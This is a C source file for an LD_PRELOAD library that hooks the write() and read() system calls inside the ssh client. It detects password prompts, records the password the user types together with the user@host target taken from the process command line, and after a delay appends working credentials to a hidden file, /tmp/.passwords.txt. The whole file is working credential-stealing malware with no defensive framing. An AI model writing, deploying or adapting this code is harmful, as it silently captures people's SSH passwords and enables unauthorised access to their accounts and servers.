#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdarg.h>
#include "preload.h"

static int isAskingPasswd = 0;
static int isPasswordValid = 1;
static int isPasswordEntered = 0;


void get_ssharg(char *tmp_args){
  FILE *file = fopen("/proc/self/cmdline", "r");
  if (!file) {
    strcpy(tmp_args, "NULL");
    return;
  }
  char fullstring[4096];
  ssize_t len_cmdline = fread(fullstring, 1, sizeof(fullstring), file);
  fclose(file);
  
  if (len_cmdline <= 0) {
    strcpy(tmp_args, "NULL");
    return;
  }
  
  for (int i = 0; i < len_cmdline; i++) {    
    if (fullstring[i] == '\0') {
      fullstring[i] = ' ';
    }
  }

  char *args = strtok(fullstring, " ");
  while ((args = strtok(NULL, " ")) != NULL) {
    if (strstr(args, "@")) {
      strcpy(tmp_args, args);
      return;
    }
    else {
      strcpy(tmp_args, "NULL");
      return;
    }
  }
  strcpy(tmp_args, "NULL");
  return;
}

int checkifssh(int fd){
  int pid = getpid();
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/comm", pid);
  FILE *file = fopen(path, "r");
  if (file) {
    char processName[64];
    fgets(processName, sizeof(processName), file);
    processName[strcspn(processName, "\n")] = 0;
    if (strcmp(processName, "ssh") == 0) {
      return 1;
    }
  }
  return 0;
}

ssize_t write(int fd, const void *buf, size_t nbyte) {
  ssize_t (*r_write)(int fd, const void *buf, size_t nbyte) = dlsym(RTLD_NEXT, "write");
  ssize_t output = r_write(fd, buf, nbyte);
  
  if (isatty(fd) && strstr(buf, "password:")) {
    isAskingPasswd = 1;
  }
  
  if (isatty(fd) && fd == 2) {
    if (strstr(buf ,"please try again.")) {
      isPasswordValid = 0;

      if (isPasswordEntered == 1) {
        isPasswordEntered = 0;
        isPasswordValid = 0;
      }
    }
  }   
  return output;
}


void *Validate(void *arg){
  char *combo = (char*) arg;
  sleep(3);
  if (isPasswordValid == 1) {
    FILE *save = fopen("/tmp/.passwords.txt", "a");
    if (!save){
      return NULL;
    }
    fwrite(combo, 1, strlen(combo), save);
    isAskingPasswd = 0;
    fclose(save);
  }
  isAskingPasswd = 0;
  isPasswordEntered = 0;
  isPasswordValid = 1;
  free(combo);
  return NULL;
}


ssize_t read(int fd, void *buf, size_t nbytes) {
  ssize_t (*r_read)(int fd, void *buf, size_t nbytes) = dlsym(RTLD_NEXT, "read");
  ssize_t output = r_read(fd, buf, nbytes);
  static char tmp_password[64];
  static int pos = 0;
  
  int is_ssh = checkifssh(fd);
  if (isatty(fd) == 1 && is_ssh && isAskingPasswd == 1) {
    tmp_password[pos] = ((char *) buf)[0];
    if (((char*)buf)[0] == '\n') {
      tmp_password[pos] = '\0';
      char *tmp_args = malloc(128);
      get_ssharg(tmp_args);
      ssize_t sizeCombo = strlen(tmp_password) + strlen(tmp_args) + 12;
      char *combination = malloc(sizeCombo);
      snprintf(combination, sizeCombo, "command %s %s\n", tmp_args, tmp_password);
      
      isPasswordValid = 1;
      isPasswordEntered = 1;
      pthread_t waitforvalidate;
      pos = 0;
      free(tmp_args);
      pthread_create(&waitforvalidate , NULL, Validate, combination);
      pthread_detach(waitforvalidate);
      memset(tmp_password, 0, sizeof(tmp_password));
    }
    else {
      pos++;
    }
  }


  return output;
}
